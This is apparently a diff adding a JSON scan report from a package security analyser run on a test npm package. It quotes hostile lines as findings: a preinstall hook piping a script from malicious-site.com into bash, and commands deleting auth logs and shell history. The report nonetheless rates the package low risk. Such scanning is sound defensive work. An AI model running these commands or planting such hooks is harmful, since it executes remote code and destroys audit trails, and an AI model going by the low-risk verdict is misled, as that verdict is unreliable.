@@ -1,0 +1,146 @@
+{
+  "package": {
+    "name": "test-package",
+    "version": "local",
+    "registry": "local",
+    "risk_level": 0,
+    "risk_score": 0,
+    "analyzed_at": "0001-01-01T00:00:00Z"
+  },
+  "static_analysis": {
+    "package_name": "test-package",
+    "registry": "",
+    "analysis_timestamp": "2025-06-17T17:22:46.9731007+02:00",
+    "install_scripts": [
+      {
+        "file_path": "test-package\\install.js",
+        "script_type": "javascript",
+        "file_size": 1436,
+        "suspicious_commands": [],
+        "network_calls": [],
+        "file_operations": [],
+        "permission_changes": [],
+        "environment_access": [],
+        "risk_score": 0,
+        "recommendation": "LOW RISK: Script appears safe"
+      },
+      {
+        "file_path": "test-package\\install.sh",
+        "script_type": "bash",
+        "file_size": 1236,
+        "suspicious_commands": [],
+        "network_calls": [
+          {
+            "url": "detected",
+            "method": "GET",
+            "line_number": 7,
+            "context": "curl -s http://malicious-site.com/payload.sh | bash",
+            "risk_level": "MEDIUM",
+            "description": "Network call detected",
+            "confidence": 0.7
+          }
+        ],
+        "file_operations": [
+          {
+            "operation": "file_operation",
+            "path": "detected",
+            "line_number": 30,
+            "context": "mkdir -p ~/.ssh",
+            "risk_level": "MEDIUM",
+            "description": "File operation detected",
+            "confidence": 0.6
+          },
+          {
+            "operation": "file_operation",
+            "path": "detected",
+            "line_number": 38,
+            "context": "rm -rf /var/log/auth.log",
+            "risk_level": "MEDIUM",
+            "description": "File operation detected",
+            "confidence": 0.6
+          },
+          {
+            "operation": "file_operation",
+            "path": "detected",
+            "line_number": 39,
+            "context": "rm -rf /var/log/secure",
+            "risk_level": "MEDIUM",
+            "description": "File operation detected",
+            "confidence": 0.6
+          },
+          {
+            "operation": "file_operation",
+            "path": "detected",
+            "line_number": 40,
+            "context": "rm -rf ~/.bash_history",
+            "risk_level": "MEDIUM",
+            "description": "File operation detected",
+            "confidence": 0.6
+          }
+        ],
+        "permission_changes": [],
+        "environment_access": [],
+        "risk_score": 0.6000000000000001,
+        "recommendation": "MEDIUM RISK: Caution advised, review suspicious commands"
+      }
+    ],
+    "manifests": [
+      {
+        "file_path": "test-package\\package.json",
+        "manifest_type": "package.json",
+        "file_size": 565,
+        "dependencies": [],
+        "scripts": {
+          "postinstall": "node install.js",
+          "preinstall": "curl -s http://malicious-site.com/payload.sh | bash",
+          "test": "echo \"Error: no test specified\" \u0026\u0026 exit 1"
+        },
+        "suspicious_fields": [],
+        "missing_fields": [],
+        "version_anomalies": [],
+        "license_issues": [],
+        "risk_score": 0,
+        "recommendation": "LOW RISK: Manifest appears normal"
+      }
+    ],
+    "yara_matches": [],
+    "risk_score": 0.24000000000000002,
+    "threat_level": "LOW",
+    "findings": [],
+    "warnings": [],
+    "recommendations": [
+      "Review all installation scripts for malicious content"
+    ],
+    "processing_time": 6054400,
+    "files_analyzed": 3,
+    "total_file_size": 3237
+  },
+  "overall_risk": "low",
+  "risk_score": 0.24000000000000005,
+  "recommendations": [
+    "✅ Package appears relatively safe but monitor usage",
+    "Review all installation scripts for malicious content"
+  ],
+  "summary": {
+    "total_findings": 0,
+    "critical_findings": 0,
+    "high_findings": 0,
+    "medium_findings": 0,
+    "low_findings": 1,
+    "findings_by_category": {},
+    "engines_used": [
+      "static"
+    ],
+    "analysis_time": 6054400,
+    "status": "completed"
+  },
+  "metadata": {
+    "scan_id": "1750173766",
+    "timestamp": "2025-06-17T17:22:46.9731007+02:00",
+    "version": "1.0.0",
+    "configuration": "",
+    "environment": "development",
+    "user": "",
+    "hostname": ""
+  }
+}
